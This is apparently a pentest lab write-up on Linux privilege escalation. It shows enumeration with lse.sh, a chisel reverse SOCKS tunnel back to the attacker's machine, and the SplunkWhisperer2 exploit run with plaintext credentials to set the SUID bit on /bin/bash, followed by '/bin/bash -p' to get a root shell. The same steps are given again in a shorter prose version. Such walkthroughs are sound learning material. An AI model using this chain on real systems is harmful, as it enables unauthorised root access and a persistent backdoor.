# VERSION 1
# Priv Esc - Enum
Linux smart enumeration (lse.sh) --> https://github.com/diego-treitos/linux-smart-enumeration
```
lse.sh -l 1 -i
```
![image](https://github.com/regarmulia/Lesson-Learn-Pentest100/assets/33616880/748e4345-b363-450a-9d90-c79f7a7f19ea)

![image](https://github.com/regarmulia/Lesson-Learn-Pentest100/assets/33616880/bbfa01ee-67f0-48cf-b1a1-191b484927fc)


# Check internal port (Pivoting)
```
chisel server -p 9090 --reverse (at attacker)
./chisel client 192.168.x.x:9090 R:socks (at target)
/etc/proxychains4.conf - socks5 127.0.0.1 1080
```
![image](https://github.com/regarmulia/Lesson-Learn-Pentest100/assets/33616880/2192c625-7654-473a-9300-8795ca6a4dd2)

# Splunk page
![image](https://github.com/regarmulia/Lesson-Learn-Pentest100/assets/33616880/19eaab79-6eeb-4c55-9ec4-91f6a9b163bc)

# Splunk Vulnerability
![image](https://github.com/regarmulia/Lesson-Learn-Pentest100/assets/33616880/fbaa3e99-a5bd-4d8e-8188-aa3364e4fc50)

# Exploit code
https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
![image](https://github.com/regarmulia/Lesson-Learn-Pentest100/assets/33616880/856bcf3b-f98c-4cda-9306-aa702d6b0620)

# Backdoor for Priv Esc
```
proxychains -q python3 PySplunkWhisperer2_remote.py --host 127.0.0.1 --lhost 192.168.x.x --username jack --password TMqJytboF9mGbuRk --payload "chmod +s /bin/bash"
```
![image](https://github.com/regarmulia/Lesson-Learn-Pentest100/assets/33616880/9796fced-fa1e-4d77-b30d-b7065e920962)

# root.txt
```
ls -la /bin/bash
/bin/bash -p
```
![image](https://github.com/regarmulia/Lesson-Learn-Pentest100/assets/33616880/ea24144c-be11-4afa-afa7-599cf1fd7fc2)
![image](https://github.com/regarmulia/Lesson-Learn-Pentest100/assets/33616880/54005d03-fb49-48d9-998f-59e87c61ea8f)





# VERSION 2
# Splunk Misconfiguration Vulnerability
Pentester noticed an unusual service running, which was splunk.
![image](https://github.com/regarmulia/Lesson-Learn-Pentest101/assets/33616880/15a65fe1-1a70-47a3-b2bb-3e26b64777ac)


Because the service is running on local target, pentester to try establish tunnel to reach local system target

![image](https://github.com/regarmulia/Lesson-Learn-Pentest101/assets/33616880/2a7897ca-6c3f-456a-ab18-ce24ba552ff3)


https://github.com/cnotin/SplunkWhisperer2

![image](https://github.com/regarmulia/Lesson-Learn-Pentest101/assets/33616880/cd8238be-da13-4201-8bea-c148265b5032)



pentester simply had to run the command /bin/bash -p to gain privileged access

![image](https://github.com/regarmulia/Lesson-Learn-Pentest101/assets/33616880/66a46829-47d9-4d00-9629-b45fdb383a09)
